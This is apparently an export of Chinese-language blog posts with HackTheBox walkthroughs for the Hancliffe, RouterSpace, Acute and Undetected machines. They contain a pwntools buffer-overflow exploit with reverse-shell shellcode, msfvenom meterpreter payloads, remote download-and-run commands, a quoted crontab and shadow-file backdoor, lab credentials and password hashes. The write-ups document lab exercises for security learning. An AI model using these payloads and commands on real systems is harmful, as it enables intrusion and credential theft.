Ghidra - Hancliffe [HackTheBox] - YouTubehttps://www.youtube.com/watch?v=r4aaNt7f-lM&amp;ab_channel=0xdf 12345678910111213141516171819202122username &#x3D; &quot;alfiansyah&quot;;enc_pass &#x3D; &quot;YXlYeDtsbD98eDtsWms5SyU&#x3D;&quot;;decrypted ： K3r4j@@nM4j@pAh!Tvoid __cdecl _SaveCreds(char *code,char *fullname)&#123; char code_copy [50]; char *fullname_copy; fullname_copy &#x3D; (char *)_malloc(100); _strcpy(fullname_copy,fullname); _strcpy(code_copy,code); return;&#125;rot47atbashbase64From Base64, Atbash Cipher, ROT47 - CyberChefhttps:&#x2F;&#x2F;gchq.github.io&#x2F;CyberChef&#x2F;#recipe&#x3D;From_Base64(&#39;A-Za-z0-9%2B&#x2F;%3D&#39;,true)Atbash_Cipher()ROT47(47)&amp;input&#x3D;WVhsWWVEdHNiRDk4ZUR0c1dtczVTeVU9 debug基础windows bof调试流程，本地运行，试行错误，比改版前的OSCP BOF难度要高，可能是OSED的难度，可用空间不足，0xdf的方式是跳回缓冲区开头，以及重用socket： 1234EIP offset 66jmp esp p32(0x7190239f)metasm &gt; jmp $-70&quot;\\xeb\\xb8&quot; exploit.py123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778#!/usr/bin/env python3from pwn import *r = remote(args['IP'], args['PORT'])# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.15 LPORT=4444 -b \"\\x00\" -f pythonbuf = b\"\"buf += b\"\\xb8\\x23\\x55\\xbb\\x84\\xdb\\xca\\xd9\\x74\\x24\\xf4\\x5f\\x31\"buf += b\"\\xc9\\xb1\\x52\\x83\\xc7\\x04\\x31\\x47\\x0e\\x03\\x64\\x5b\\x59\"buf += b\"\\x71\\x96\\x8b\\x1f\\x7a\\x66\\x4c\\x40\\xf2\\x83\\x7d\\x40\\x60\"buf += b\"\\xc0\\x2e\\x70\\xe2\\x84\\xc2\\xfb\\xa6\\x3c\\x50\\x89\\x6e\\x33\"buf += b\"\\xd1\\x24\\x49\\x7a\\xe2\\x15\\xa9\\x1d\\x60\\x64\\xfe\\xfd\\x59\"buf += b\"\\xa7\\xf3\\xfc\\x9e\\xda\\xfe\\xac\\x77\\x90\\xad\\x40\\xf3\\xec\"buf += b\"\\x6d\\xeb\\x4f\\xe0\\xf5\\x08\\x07\\x03\\xd7\\x9f\\x13\\x5a\\xf7\"buf += b\"\\x1e\\xf7\\xd6\\xbe\\x38\\x14\\xd2\\x09\\xb3\\xee\\xa8\\x8b\\x15\"buf += b\"\\x3f\\x50\\x27\\x58\\x8f\\xa3\\x39\\x9d\\x28\\x5c\\x4c\\xd7\\x4a\"buf += b\"\\xe1\\x57\\x2c\\x30\\x3d\\xdd\\xb6\\x92\\xb6\\x45\\x12\\x22\\x1a\"buf += b\"\\x13\\xd1\\x28\\xd7\\x57\\xbd\\x2c\\xe6\\xb4\\xb6\\x49\\x63\\x3b\"buf += b\"\\x18\\xd8\\x37\\x18\\xbc\\x80\\xec\\x01\\xe5\\x6c\\x42\\x3d\\xf5\"buf += b\"\\xce\\x3b\\x9b\\x7e\\xe2\\x28\\x96\\xdd\\x6b\\x9c\\x9b\\xdd\\x6b\"buf += b\"\\x8a\\xac\\xae\\x59\\x15\\x07\\x38\\xd2\\xde\\x81\\xbf\\x15\\xf5\"buf += b\"\\x76\\x2f\\xe8\\xf6\\x86\\x66\\x2f\\xa2\\xd6\\x10\\x86\\xcb\\xbc\"buf += b\"\\xe0\\x27\\x1e\\x12\\xb0\\x87\\xf1\\xd3\\x60\\x68\\xa2\\xbb\\x6a\"buf += b\"\\x67\\x9d\\xdc\\x95\\xad\\xb6\\x77\\x6c\\x26\\xb3\\x8d\\x60\\xb9\"buf += b\"\\xab\\x93\\x7c\\xd4\\x77\\x1d\\x9a\\xbc\\x97\\x4b\\x35\\x29\\x01\"buf += b\"\\xd6\\xcd\\xc8\\xce\\xcc\\xa8\\xcb\\x45\\xe3\\x4d\\x85\\xad\\x8e\"buf += b\"\\x5d\\x72\\x5e\\xc5\\x3f\\xd5\\x61\\xf3\\x57\\xb9\\xf0\\x98\\xa7\"buf += b\"\\xb4\\xe8\\x36\\xf0\\x91\\xdf\\x4e\\x94\\x0f\\x79\\xf9\\x8a\\xcd\"buf += b\"\\x1f\\xc2\\x0e\\x0a\\xdc\\xcd\\x8f\\xdf\\x58\\xea\\x9f\\x19\\x60\"buf += b\"\\xb6\\xcb\\xf5\\x37\\x60\\xa5\\xb3\\xe1\\xc2\\x1f\\x6a\\x5d\\x8d\"buf += b\"\\xf7\\xeb\\xad\\x0e\\x81\\xf3\\xfb\\xf8\\x6d\\x45\\x52\\xbd\\x92\"buf += b\"\\x6a\\x32\\x49\\xeb\\x96\\xa2\\xb6\\x26\\x13\\xd2\\xfc\\x6a\\x32\"buf += b\"\\x7b\\x59\\xff\\x06\\xe6\\x5a\\x2a\\x44\\x1f\\xd9\\xde\\x35\\xe4\"buf += b\"\\xc1\\xab\\x30\\xa0\\x45\\x40\\x49\\xb9\\x23\\x66\\xfe\\xba\\x61\"shellcode = bufrecv_sc = ( # get socket descriptor in esi b\"\\x54\" # push esp b\"\\x58\" # pop eax b\"\\x66\\x05\\x49\\x01\" # add ax, 0x149 b\"\\x66\\x2d\\x01\\x01\" # sub ax, 0x101 b\"\\x8b\\x30\" # mov esi, dword [eax] # make space on stack b\"\\x83\\xec\\x64\" # sub esp, 0x64 # push recv args b\"\\x31\\xdb\" # xor ebx, ebx b\"\\x53\" # push ebx, recv flags = 0 b\"\\x66\\x81\\xc3\\x04\\x04\" # add bx, 0x404 b\"\\x53\" # push ebx, size = 0x404 b\"\\x54\" # push esp b\"\\x5b\" # pop ebx b\"\\x83\\xc3\\x64\" # add ebx, 0x64 b\"\\x53\" # push ebx, buffer b\"\\x56\" # push esi, sock descriptor # call recv b\"\\x3e\\xa1\\xac\\x82\\x90\\x71\" # mov eax, [0x719082ac] b\"\\xff\\xd0\" # call eax )payload = recv_sc + b\"\\x90\"*(66-len(recv_sc)) + p32(0x7190239f) + b\"\\xeb\\xb8\"r.recvuntil(b\"Username: \")r.sendline(b\"alfiansyah\")r.recvuntil(b\"Password: \")r.sendline(b\"K3r4j@@nM4j@pAh!T\")r.recvuntil(b\"FullName: \")r.sendline(b\"0xdf\")r.recvuntil(b\"Input Your Code: \")r.sendline(payload)time.sleep(1)r.send(shellcode) root flagbof exp打到administrator： 参考资料 scottparry/hashpass: A Stateless Password Manager written in PHPhttps://github.com/scottparry/hashpass https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf mpgn/CVE-2018-16341: CVE-2018-16341 - Nuxeo Remote Code Execution without authentication using Server Side Template Injectionhttps://github.com/mpgn/CVE-2018-16341 Nuxeo 认证绕过和RCE漏洞分析（CVE-2018-16341) - 斗象能力中心https://blog.riskivy.com/nuxeo-rce-analysis-cve-2018-16341/ Unified Remote 3.9.0.2463 - Remote Code Execution - Windows remote Exploithttps://www.exploit-db.com/exploits/49587 lclevy/firepwd: firepwd.py, an open source tool to decrypt Mozilla protected passwordshttps://github.com/lclevy/firepwd EXE Analysis with Ghidra - Hancliffe [HackTheBox] - YouTubehttps://www.youtube.com/watch?v=r4aaNt7f-lM&amp;ab_channel=0xdf HTB: Hancliffe | 0xdf hacks stuffhttps://0xdf.gitlab.io/2022/03/05/htb-hancliffe.html https://www.hackthebox.com/home/machines/writeup/388 HackTheBox - Hancliffe - YouTubehttps://www.youtube.com/watch?v=kA-bkftyyY0&amp;ab_channel=IppSec","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"RouterSpace - HackTheBox","slug":"RouterSpace-HackTheBox","date":"2022-03-04T08:12:15.000Z","updated":"2022-07-11T05:41:18.471Z","comments":true,"path":"2022/03/04/RouterSpace-HackTheBox/","link":"","permalink":"https://darkwing.moe/2022/03/04/RouterSpace-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.com/home/machines/profile/444 10.10.11.148 端口扫描22和80: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108$ nmap -sC -sV 10.10.11.148Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-04 14:36 CSTNmap scan report for 10.10.11.148Host is up (0.18s latency).Not shown: 998 filtered tcp ports (no-response)PORT STATE SERVICE VERSION22/tcp open ssh (protocol 2.0)| fingerprint-strings:| NULL:|_ SSH-2.0-RouterSpace Packet Filtering V1| ssh-hostkey:| 3072 f4:e4:c8:0a:a6:af:66:93:af:69:5a:a9:bc:75:f9:0c (RSA)| 256 7f:05:cd:8c:42:7b:a9:4a:b2:e6:35:2c:c4:59:78:02 (ECDSA)|_ 256 2f:d7:a8:8b:be:2d:10:b0:c9:b4:29:52:a8:94:24:78 (ED25519)80/tcp open http|_http-title: RouterSpace|_http-trane-info: Problem with XML parsing of /evox/about| fingerprint-strings:| FourOhFourRequest:| HTTP/1.1 200 OK| X-Powered-By: RouterSpace| X-Cdn: RouterSpace-47955| Content-Type: text/html; charset=utf-8| Content-Length: 70| ETag: W/\"46-0bikj2VIMqL+J3GaKSoinFJT1RQ\"| Date: Fri, 04 Mar 2022 06:38:18 GMT| Connection: close| Suspicious activity detected !!! &#123;RequestID: e uT 2 rJz T &#125;| GetRequest:| HTTP/1.1 200 OK| X-Powered-By: RouterSpace| X-Cdn: RouterSpace-24043| Accept-Ranges: bytes| Cache-Control: public, max-age=0| Last-Modified: Mon, 22 Nov 2021 11:33:57 GMT| ETag: W/\"652c-17d476c9285\"| Content-Type: text/html; charset=UTF-8| Content-Length: 25900| Date: Fri, 04 Mar 2022 06:38:16 GMT| Connection: close| &lt;!doctype html&gt;| &lt;html class=\"no-js\" lang=\"zxx\"&gt;| &lt;head&gt;| &lt;meta charset=\"utf-8\"&gt;| &lt;meta http-equiv=\"x-ua-compatible\" content=\"ie=edge\"&gt;| &lt;title&gt;RouterSpace&lt;/title&gt;| &lt;meta name=\"description\" content=\"\"&gt;| &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"&gt;| &lt;link rel=\"stylesheet\" href=\"css/bootstrap.min.css\"&gt;| &lt;link rel=\"stylesheet\" href=\"css/owl.carousel.min.css\"&gt;| &lt;link rel=\"stylesheet\" href=\"css/magnific-popup.css\"&gt;| &lt;link rel=\"stylesheet\" href=\"css/font-awesome.min.css\"&gt;| &lt;link rel=\"stylesheet\" href=\"css/themify-icons.css\"&gt;| HTTPOptions:| HTTP/1.1 200 OK| X-Powered-By: RouterSpace| X-Cdn: RouterSpace-90783| Allow: GET,HEAD,POST| Content-Type: text/html; charset=utf-8| Content-Length: 13| ETag: W/\"d-bMedpZYGrVt1nR4x+qdNZ2GqyRo\"| Date: Fri, 04 Mar 2022 06:38:17 GMT| Connection: close| GET,HEAD,POST| RTSPRequest, X11Probe:| HTTP/1.1 400 Bad Request|_ Connection: close2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============SF-Port22-TCP:V=7.92%I=7%D=3/4%Time=6221B3D8%P=x86_64-apple-darwin20.4.0%rSF:(NULL,29,\"SSH-2\\.0-RouterSpace\\x20Packet\\x20Filtering\\x20V1\\r\\n\");==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============SF-Port80-TCP:V=7.92%I=7%D=3/4%Time=6221B3D8%P=x86_64-apple-darwin20.4.0%rSF:(GetRequest,31BA,\"HTTP/1\\.1\\x20200\\x20OK\\r\\nX-Powered-By:\\x20RouterSpacSF:e\\r\\nX-Cdn:\\x20RouterSpace-24043\\r\\nAccept-Ranges:\\x20bytes\\r\\nCache-CoSF:ntrol:\\x20public,\\x20max-age=0\\r\\nLast-Modified:\\x20Mon,\\x2022\\x20Nov\\xSF:202021\\x2011:33:57\\x20GMT\\r\\nETag:\\x20W/\\\"652c-17d476c9285\\\"\\r\\nContentSF:-Type:\\x20text/html;\\x20charset=UTF-8\\r\\nContent-Length:\\x2025900\\r\\nDaSF:te:\\x20Fri,\\x2004\\x20Mar\\x202022\\x2006:38:16\\x20GMT\\r\\nConnection:\\x20cSF:lose\\r\\n\\r\\n&lt;!doctype\\x20html&gt;\\n&lt;html\\x20class=\\\"no-js\\\"\\x20lang=\\\"zxx\\SF:\"&gt;\\n&lt;head&gt;\\n\\x20\\x20\\x20\\x20&lt;meta\\x20charset=\\\"utf-8\\\"&gt;\\n\\x20\\x20\\x20\\xSF:20&lt;meta\\x20http-equiv=\\\"x-ua-compatible\\\"\\x20content=\\\"ie=edge\\\"&gt;\\n\\x20SF:\\x20\\x20\\x20&lt;title&gt;RouterSpace&lt;/title&gt;\\n\\x20\\x20\\x20\\x20&lt;meta\\x20name=\\SF:\"description\\\"\\x20content=\\\"\\\"&gt;\\n\\x20\\x20\\x20\\x20&lt;meta\\x20name=\\\"viewpoSF:rt\\\"\\x20content=\\\"width=device-width,\\x20initial-scale=1\\\"&gt;\\n\\n\\x20\\x20SF:\\x20\\x20&lt;link\\x20rel=\\\"stylesheet\\\"\\x20href=\\\"css/bootstrap\\.min\\.css\\\"SF:&gt;\\n\\x20\\x20\\x20\\x20&lt;link\\x20rel=\\\"stylesheet\\\"\\x20href=\\\"css/owl\\.carouSF:sel\\.min\\.css\\\"&gt;\\n\\x20\\x20\\x20\\x20&lt;link\\x20rel=\\\"stylesheet\\\"\\x20href=\\SF:\"css/magnific-popup\\.css\\\"&gt;\\n\\x20\\x20\\x20\\x20&lt;link\\x20rel=\\\"stylesheet\\SF:\"\\x20href=\\\"css/font-awesome\\.min\\.css\\\"&gt;\\n\\x20\\x20\\x20\\x20&lt;link\\x20relSF:=\\\"stylesheet\\\"\\x20href=\\\"css/themify-icons\\.css\\\"&gt;\\n\\x20\")%r(HTTPOptioSF:ns,108,\"HTTP/1\\.1\\x20200\\x20OK\\r\\nX-Powered-By:\\x20RouterSpace\\r\\nX-CdnSF::\\x20RouterSpace-90783\\r\\nAllow:\\x20GET,HEAD,POST\\r\\nContent-Type:\\x20tSF:ext/html;\\x20charset=utf-8\\r\\nContent-Length:\\x2013\\r\\nETag:\\x20W/\\\"d-bSF:MedpZYGrVt1nR4x\\+qdNZ2GqyRo\\\"\\r\\nDate:\\x20Fri,\\x2004\\x20Mar\\x202022\\x20SF:06:38:17\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\nGET,HEAD,POST\")%r(RTSPReSF:quest,2F,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\x20close\\r\\SF:n\\r\\n\")%r(X11Probe,2F,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnectionSF::\\x20close\\r\\n\\r\\n\")%r(FourOhFourRequest,12C,\"HTTP/1\\.1\\x20200\\x20OK\\r\\SF:nX-Powered-By:\\x20RouterSpace\\r\\nX-Cdn:\\x20RouterSpace-47955\\r\\nContentSF:-Type:\\x20text/html;\\x20charset=utf-8\\r\\nContent-Length:\\x2070\\r\\nETag:SF:\\x20W/\\\"46-0bikj2VIMqL\\+J3GaKSoinFJT1RQ\\\"\\r\\nDate:\\x20Fri,\\x2004\\x20MarSF:\\x202022\\x2006:38:18\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\nSuspicious\\xSF:20activity\\x20detected\\x20!!!\\x20&#123;RequestID:\\x20\\x20\\x20e\\x20\\x20uT\\x20SF:\\x20\\x20\\x202\\x20rJz\\x20T\\x20\\x20&#125;\\n\\n\\n\\n\");Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 133.80 seconds 80大概是一个连接管理路由器的，提供一个apk下载： RouterSpace.apkapk下载下来，安装测试运行，设置好代理走本地burp，这样可以使用本地网络包括openvpn： 1234adb shell settings put global http_proxy 192.168.2.1:8087# 取消代理adb shell settings put global http_proxy :0 安装运行发现有个检查状态功能，点击是向routerspace.htb发送一个post请求： routerspace.htb添加hosts后进一步测试： 110.10.11.148 routerspace.htb 命令注入这种场景很容易想到命令注入，验证存在： ssh 公钥利用命令注入写公钥 12mkdir ~/.sshecho \"xxx\" &gt;&gt; ~/.ssh/authorized_keys user flag 之后ssh连接即可： 提权信息直接跑LinPeas,上面那张图能看到其他人已经传过运行过了，连CVE都直接放在那了。。。： 文件下载有限制，可以使用scp传文件： sudo版本搜到相关漏洞： mohinparamasivam/Sudo-1.8.31-Root-Exploit: Root shell PoC for CVE-2021-3156https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit 提权 &amp; root flagexp一键： shadow1root:$6$lw6PWI9kEABNZiKm$UoysFK0xDZgFk828w.7t30d8iRi6Qxv9xTkwvjJPRRxJvFQwTOkjvUq5y4OUO&#x2F;LYV8KlqORQ4kolNeDfGFQd5.:18956:0:99999:7::: 参考资料 mohinparamasivam/Sudo-1.8.31-Root-Exploit: Root shell PoC for CVE-2021-3156https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit worawit/CVE-2021-3156: Sudo Baron Samedit Exploithttps://github.com/worawit/CVE-2021-3156 Hackthebox Routerspace Writeup | 0xDedinfosec Bloghttps://0xdedinfosec.vercel.app/posts/hackthebox-routerspace-writeup","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Acute - HackTheBox","slug":"Acute-HackTheBox","date":"2022-03-04T06:27:29.000Z","updated":"2022-07-18T00:57:16.946Z","comments":true,"path":"2022/03/04/Acute-HackTheBox/","link":"","permalink":"https://darkwing.moe/2022/03/04/Acute-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.com/home/machines/profile/438 10.10.11.145 端口扫描只有一个443： 1234567891011121314151617181920$ nmap -sC -sV 10.10.11.145Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-01 14:03 CSTNmap scan report for 10.10.11.145Host is up (0.088s latency).Not shown: 999 filtered tcp ports (no-response)PORT STATE SERVICE VERSION443/tcp open ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)| ssl-cert: Subject: commonName=atsserver.acute.local| Subject Alternative Name: DNS:atsserver.acute.local, DNS:atsserver| Not valid before: 2022-01-06T06:34:58|_Not valid after: 2030-01-04T06:34:58|_http-title: Not Found|_http-server-header: Microsoft-HTTPAPI/2.0| tls-alpn:|_ http/1.1|_ssl-date: 2022-03-01T06:05:41+00:00; 0s from scanner time.Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 122.22 seconds 443直接访问是404，加hosts后访问,是一个wordpress： 110.10.11.145 atsserver.acute.local atsserver.acute.localabout us里可以得到一些用户名，右上角可以下载到一个文件，里面提到默认密码： 另外也提到了PSWA(PowerShell WebAccess)： 也给出了PSWA链接： PSWAPSWA登录需要用户名密码和主机名，用户名列表和默认密码已经有了，文档的exif信息中可以得到主机名： users.txt根据网页上得到的用户名和文档中得到的用户名格式整理成字典 123456edavieschallawallaceimonksjmorgonlhopkins edavies123edaviesPassword1!Acute-Pc01 edavies用户没有修改默认密码，可以登录进PSWA： 内网横向看起来现在是在一个容器或者虚拟机中： 端口扫描使用powershell进行内网网关进行端口扫描： https://github.com/InfosecMatter/Minimalistic-offensive-security-tools 扫描比较费时间： 12IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.8:7777/port-scan-tcp.ps1')1..1024 | foreach &#123; port-scan-tcp 172.16.22.1 $_ &#125; &gt; ports_open_gateway bypass defender当前主机运行着defender，但配置有白名单路径,可以在白名单目录中上传执行exe： 12345reg query \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.8 LPORT=4444 -f exe -o msf.execurl http://10.10.14.8:7777/msf.exe -o msf.exe screenshare已有的session监控桌面，会发现定时运行powershell，其中得到主机名用户名密码： 12345meterpreter &gt; screenshare -q 100$pass = ConvertTo-SecureString \"W3_4R3_th3_f0rce.\" -AsPlaintext -Force$cred = New-Object System.Management.Automation.PSCredential (\"acute\\imonks\", $pass)Enter-PSSession -computername ATSSERVER -ConfigurationName dc_manage -credential $cred ATSSERVER直接在PSWA中使用得到的命令，不能在PowerShell PSSession中运行Enter-PSSession,但可以通过Invoke-Command在目标主机上运行命令： 1Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -credential $cred -command &#123;whoami&#125; user flag现在得到的就是外部宿主机用户权限，读取usre.txt: jmorgan &amp;&amp; ACUTE-PC01 systemwm.ps1中得到jmorgan用户相关信息，他会对Acute-PC01即容器进行一些操作： 我们可以尝试修改其中内容，以jmorgan用户身份运行我们容器内的msf.exe: 123Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -credential $cred -ScriptBlock&#123;((cat \"c:\\users\\imonks\\Desktop\\wm.ps1\" -Raw) -replace 'Get-Volume','cmd.exe /c c:\\utils\\msf.exe') | set-content -path c:\\users\\imonks\\Desktop\\wm.ps1&#125; Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -credential $cred -ScriptBlock&#123;cat c:\\users\\imonks\\Desktop\\wm.ps1&#125;Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred -ScriptBlock&#123;C:\\Users\\imonks\\Desktop\\wm.ps1&#125; jmorgan在管理员组中，可以直接得到ACUTE-PC01的system权限： hashdump &amp;&amp; crackdump hash,可以破解出来一个密码： 1234567Administrator:500:aad3b435b51404eeaad3b435b51404ee:a29f7623fd11550def0192de9246f46b:::DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::Natasha:1001:aad3b435b51404eeaad3b435b51404ee:29ab86c5c4d2aab957763e5c1720486d:::WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:24571eab88ac0e2dcef127b8e9ad4740:::a29f7623fd11550def0192de9246f46b Password@123 AWallace前面在宿主机进行信息搜集可以知道awallace在manager组中，尝试发现可以复用这个密码 123$password = ConvertTo-SecureString \"Password@123\" -AsPlainText -Force$cred = New-Object System.Management.Automation.PSCredential(\"Acute\\AWallace\",$password)Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred -Command &#123;whoami&#125; keepmeon查看目录可以发现一个keepmeon,大概是lois用户每5分钟运行,而最初的文档中也提到lois有权限更改组成员： 12Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred -Command &#123;ls 'c:\\program files\\keepmeon'&#125;Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred -Command &#123;cat 'c:\\program files\\keepmeon\\keepmeon.bat'&#125; site admin所以我们可以把已有的AWallace加入到site admin组中, 新增一个bat，等待5分钟自动执行： 12345Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred -ScriptBlock &#123;Set-Content -Path 'c:\\program files\\Keepmeon\\admin.bat' -Value 'net group site_admin awallace /add /domain'&#125;Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred -ScriptBlock &#123;ls 'c:\\program files\\Keepmeon\\'&#125;Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred -ScriptBlock &#123;cat 'c:\\program files\\Keepmeon\\admin.bat'&#125;Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred -Command &#123;whoami /groups&#125; 执行后我们不仅有site admin,也自动成为了域管： root flag12Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred -ScriptBlock &#123;ls 'c:\\users\\administrator\\desktop'&#125;Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred -ScriptBlock &#123;cat 'c:\\users\\administrator\\desktop\\root.txt'&#125; 参考资料 https://github.com/InfosecMatter/Minimalistic-offensive-security-tools Official Acute Discussion - HTB Content / Machines - Hack The Box :: Forumshttps://forum.hackthebox.com/t/official-acute-discussion/252066","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Undetected - HackTheBox","slug":"Undetected-HackTheBox","date":"2022-02-24T08:13:28.000Z","updated":"2022-07-04T01:26:49.821Z","comments":true,"path":"2022/02/24/Undetected-HackTheBox/","link":"","permalink":"https://darkwing.moe/2022/02/24/Undetected-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.com/home/machines/profile/439 10.10.11.146 端口扫描22和80: 1234567891011121314151617$ nmap -sC -sV 10.10.11.146Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-24 14:08 CSTNmap scan report for 10.10.11.146Host is up (0.19s latency).Not shown: 998 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2 (protocol 2.0)| ssh-hostkey:| 3072 be:66:06:dd:20:77:ef:98:7f:6e:73:4a:98:a5:d8:f0 (RSA)| 256 1f:a2:09:72:70:68:f4:58:ed:1f:6c:49:7d:e2:13:39 (ECDSA)|_ 256 70:15:39:94:c2:cd:64:cb:b2:3b:d1:3e:f6:09:44:e8 (ED25519)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Diana's JewelryService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 58.84 seconds 80在线商城，store是另一个子域名： store.djewelry.htb加hosts后访问： 目录扫描store注册登录功能现在不能使用，进行目录扫描,发现vendor目录可直接访问： 123456789101112gobuster dir -w ~/Tools/dict/SecLists/Discovery/Web-Content/common.txt -t 50 -u http://store.djewelry.htb/ -x php,html,txt/cart.php (Status: 200) [Size: 4396]/css (Status: 301) [Size: 322] [--&gt; http://store.djewelry.htb/css/] /error404.html (Status: 200) [Size: 3974]/fonts (Status: 301) [Size: 324] [--&gt; http://store.djewelry.htb/fonts/]/images (Status: 301) [Size: 325] [--&gt; http://store.djewelry.htb/images/]/index.php (Status: 200) [Size: 6215]/js (Status: 301) [Size: 321] [--&gt; http://store.djewelry.htb/js/]/login.php (Status: 200) [Size: 4129]/products.php (Status: 200) [Size: 7447]/vendor (Status: 301) [Size: 325] [--&gt; http://store.djewelry.htb/vendor/] PHPUnit发现5.6版本的phpunit： 可以搜到相关漏洞： CVE-2017-9841: What is it, and how do we protect our customers? - OVHcloud Bloghttps://blog.ovhcloud.com/cve-2017-9841-what-is-it-and-how-do-we-protect-our-customers/ CVE-2017-9841利用漏洞执行命令，获取shell： 1curl -XPOST --data '&lt;?php system(\"id\"); ?&gt;' http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php /var/backups/info简单的枚举可以发现一个info文件，下载下来分析： 可以在info中发现一串编码： hash crack根据解码出来的内容，可以知道是对非root用户，用户名后加1，使用指定密码hash，破解这个hash,得到复制的普通用户的密码： 12sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash.txtihatehackers info command1wget tempfiles.xyz/authorized_keys -O /root/.ssh/authorized_keys; wget tempfiles.xyz/.main -O /var/lib/.main; chmod 755 /var/lib/.main; echo \"* 3 * * * root /var/lib/.main\" &gt;&gt; /etc/crontab; awk -F\":\" '$7 == \"/bin/bash\" &amp;&amp; $3 &gt;= 1000 &#123;system(\"echo \"$1\"1:\\$6\\$zS7ykHfFMg3aYht4\\$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:18813:0:99999:7::: &gt;&gt; /etc/shadow\")&#125;' /etc/passwd; awk -F\":\" '$7 == \"/bin/bash\" &amp;&amp; $3 &gt;= 1000 &#123;system(\"echo \"$1\" \"$3\" \"$6\" \"$7\" &gt; users.txt\")&#125;' /etc/passwd; while read -r user group home shell _; do echo \"$user\"1\":x:$group:$group:,,,:$home:$shell\" &gt;&gt; /etc/passwd; done &lt; users.txt; rm users.txt; user flag根据/etc/passwd中的结果，有steven和steven1两个普通用户，得到的密码可以登录steven1: 提权信息/var/mail/steven里有一封邮件提到apache可疑行为： mod_reader.so查看apache模块可以发现一个时间与其他模块明显差异比较大的mod_reader.so： 下载下来分析，可以发现hook_post_config中一串base64: 解码可以发现是替换sshd后门： 1wget sharefiles.xyz/image.jpeg -O /usr/sbin/sshd; touch -d `date +%Y-%m-%d -r /usr/sbin/a2enmod` /usr/sbin/sshd sshd后门sshd也下载下来分析,其中auth_password函数得到后门密码验证过程： 这里有点问题，我本地ghidra出来的backdoor结果有两部分是错误的，正确的放在后面了 然后就是按顺序排列，hex 进行异或，得到后门密码： Password123456789100xa50xa9f40xbcf0b5e30xb2d6f4a0fda0b3d60xfdb3d6e70xf7bbfdc80xa4b3a3f30xf0e7abd6@&#x3D;qfe5%2^k-aq@%k@%6k6b@$u#f*b?3 root flag使用后门密码登录，得到root： 1root:$6$xxydXHZzlPY4U0lU$qJDDFjfkXQnhUcESjCaoCWjMT9gAPnyCLJ8U5l2KSlOO3hPMUVxAOUZwvcm87Vkz0Vyc.&#x2F;cDsb2nNZT0dYIbv.:19031:0:99999:7::: 参考资料 CVE-2017-9841: What is it, and how do we protect our customers? - OVHcloud 